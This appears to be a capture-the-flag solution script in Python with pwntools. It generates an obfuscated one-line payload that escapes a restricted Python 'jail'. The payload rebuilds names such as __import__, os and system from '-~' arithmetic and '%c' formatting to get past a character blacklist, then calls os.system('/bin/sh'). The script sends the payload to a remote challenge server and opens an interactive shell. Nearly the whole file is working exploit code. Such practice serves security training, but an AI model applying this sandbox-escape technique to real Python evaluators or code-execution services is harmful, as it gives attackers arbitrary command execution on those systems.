#!/usr/bin/env python3
from pwn import *

# ————————————————————————————————————————————————————————————————
# 0. Helpers – build integers & strings without digit literals
# ————————————————————————————————————————————————————————————————

BASE_VAR = "I"   # after the walrus, I == 1

def expr_for(n: int) -> str:
    """
    Produce an expression (only I and -~) that evaluates to the integer n (n>=1).
      I    -> 1
      -~I  -> 2
      -~-~I -> 3
      ...
    """
    if n < 1:
        raise ValueError("n must be >= 1")
    if n == 1:
        return BASE_VAR
    return "-~" * (n-1) + BASE_VAR

def char_expr(ch: str) -> str:
    """
    Return a snippet that at runtime yields the one-char string `ch`,
    via '%c' % (<expr_for(code)>).
    """
    code = expr_for(ord(ch))
    return f"'%c' % ({code})"

def string_expr(txt: str) -> str:
    """
    Return a snippet that at runtime yields the entire string `txt`,
    by using '%c%c...%c' % (<expr1>, <expr2>, ...).
    """
    # Build the literal format: '%c%c...%c'
    fmt = "'" + "%c" * len(txt) + "'"
    # Build the tuple of expr_for(...) values
    exprs = ",".join(expr_for(ord(c)) for c in txt)
    # Single‐element tuple needs a trailing comma
    if len(txt) == 1:
        exprs += ","
    return f"{fmt} % ({exprs})"

def getattr_call(obj: str, attr: str) -> str:
    """
    Emit c(<obj>, <dynamic-attr-name>), i.e. getattr(<obj>, "<attr>").
    """
    return f"c({obj},{string_expr(attr)})"


# ————————————————————————————————————————————————————————————————
# 1. Build the one‐line exploit payload
#    It is a 2-tuple: (I:=('@'<'A'), <spawn‐shell‐expr>)
#    Uses exactly one '<', one '=', and only % formatting.
# ————————————————————————————————————————————————————————————————

# 1a) The walrus – sets I = 1  (one '<' and one '=')
init = f"(I:=('@'<'A'))"

# 1b) Build the needed names and strings at runtime:
g_name   = string_expr("__globals__")
b_name   = string_expr("__builtins__")
imp_name = string_expr("__import__")
os_mod   = string_expr("os")
sys_name = string_expr("system")
sh_str   = string_expr("/bin/sh")

# 1c) Chain getattr calls / indexing:
step1 = getattr_call("c", "__self__")               # getattr(c, "__self__")
step2 = f"c({step1},{imp_name})({os_mod})"          # getattr(B, "__import__")("os")
step3 = f"c({step2},{sys_name})({sh_str})"          # getattr(os, "system")("/bin/sh")

# 1d) Wrap into the final 2‐tuple
PAYLOAD = f"({init},{step3})"

# Quick sanity‐check against the jail’s own rules
BLACK = set("abdefghijklmnopqrstuvwxyz1234567890\\;._")
assert not [ch for ch in PAYLOAD if ch in BLACK], "Leaked a forbidden char!"
assert PAYLOAD.count('<') + PAYLOAD.count('>') == 1, "Wrong count of < or >"
assert PAYLOAD.count('=') == 1, "Wrong count of ="

print(f"→ Generated payload (length {len(PAYLOAD)}):\n")
print(PAYLOAD)

# ————————————————————————————————————————————————————————————————
# 2. Solve the chall!
# ————————————————————————————————————————————————————————————————

p = remote("play.scriptsorcerers.xyz", 10480)

p.recvuntil("Enter payload: ")
p.sendline(PAYLOAD.encode())
p.interactive()